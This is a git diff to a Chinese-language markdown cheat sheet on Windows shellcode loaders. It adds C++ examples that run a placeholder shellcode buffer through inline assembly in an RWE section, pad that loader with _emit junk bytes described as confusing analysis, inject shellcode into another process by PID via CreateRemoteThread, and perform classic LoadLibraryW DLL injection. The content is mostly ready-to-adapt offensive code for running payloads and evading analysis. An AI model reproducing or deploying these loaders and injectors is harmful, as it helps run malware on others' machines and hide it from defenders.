@@ -62,6 +62,50 @@ int main() {
 }
 ```
 
+嵌入汇编加载：  
+```cpp
+#include <Windows.h>
+#include <stdio.h>
+
+#pragma data_seg("vdata")
+unsigned char buf[] = "\x11\x22";
+#pragma data_seg()
+#pragma comment(linker, "/SECTION:vdata,RWE")
+
+int main() {
+	
+	__asm{
+		mov eax, offset buf
+		jmp eax
+	}
+
+	return 0;
+}
+```
+
+汇编花指令：  
+```cpp
+#include <Windows.h>
+#include <stdio.h>
+
+#pragma data_seg("vdata")
+unsigned char buf[] = "\x11\x22";
+#pragma data_seg()
+#pragma comment(linker, "/SECTION:vdata,RWE")
+
+int main() {
+
+	__asm {
+		mov eax, offset buf
+		jmp eax
+		_emit 0xAA  // _emit 在当前位置放一个指定的字节，没有实际作用，干扰分析
+		_emit 0xBB
+	}
+
+	return 0;
+}
+```
+
 
 ## 使用CreateThread
 ```cpp
@@ -78,6 +122,57 @@ int main() {
 	WaitForSingleObject(hThread, INFINITE);
 
 	return 0;
+}
+```
+
+
+## 使用CreateRemoteThread
+```cpp
+// 未测试
+#include "Windows.h"
+#include <stdio.h>
+
+int main(int argc, char* argv[])
+{
+    unsigned char shellcode[] ="你的shellcode";
+
+    HANDLE processHandle;
+    HANDLE remoteThread;
+    PVOID remoteBuffer;
+
+    printf("Injecting to PID: %i", atoi(argv[1]));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+    CloseHandle(processHandle);
+
+    return 0;
+}
+```
+
+
+## 经典dll注入
+```cpp
+// 未测试
+#include "Windows.h"
+#include <stdio.h>
+
+
+int main(int argc, char* argv[]) {
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    wchar_t dllPath[] = TEXT("你的DLL地址");
+
+    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+    CloseHandle(processHandle);
+
+    return 0;
 }
 ```
 
@@ -142,6 +237,8 @@ int main()
 3. APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
 4. https://www.bilibili.com/video/BV1GS4y1U7EN
 5. https://www.bilibili.com/video/BV1Ti4y1y7Dh
+6. https://learn.microsoft.com/en-us/cpp/assembler/inline/emit-pseudoinstruction?view=msvc-170
+7. https://zhuanlan.zhihu.com/p/548583127
 
 
 ---
